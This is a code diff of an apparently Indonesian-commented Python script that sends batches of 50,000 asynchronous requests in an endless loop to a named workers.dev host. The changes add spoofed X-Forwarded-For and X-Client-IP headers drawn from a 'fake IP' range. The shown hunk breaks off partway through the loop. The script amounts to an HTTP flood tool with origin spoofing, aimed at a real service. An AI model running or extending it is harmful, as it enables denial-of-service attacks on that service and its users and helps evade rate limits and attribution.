@@ -1,18 +1,30 @@
-import aiohttp 
-import asyncio   
+import aiohttp
+import asyncio
+
+# Konfigurasi IP palsu
+fake_ip_range = '28.0.0.1/8'
+fake_ip_filter = ['*.lan', '*.local']
+nameserver = ['1.1.1.1']
+
+# Buat kustom header dengan alamat IP palsu
+custom_headers = {
+    'X-Forwarded-For': fake_ip_range,
+    'X-Client-IP': fake_ip_range,
+    'Host': 'sxtcp.tg-index.workers.dev'  # Ganti dengan host yang sesuai
+}
 
 async def send_request(url):
     try:
-        async with aiohttp.ClientSession() as session:
+        async with aiohttp.ClientSession(headers=custom_headers) as session:
             async with session.get(url) as response:
                 response_text = await response.text()
                 return response_text
     except Exception as e:
-        return None 
+        return None
 
 async def main():
     default_url = 'https://sxtcp.tg-index.workers.dev'  # URL default
-    num_requests = 50000 # Jumlah permintaan yang ingin Anda kirim
+    num_requests = 50000  # Jumlah permintaan yang ingin Anda kirim
 
     while True:
         # Inisialisasi list untuk menyimpan hasil respons
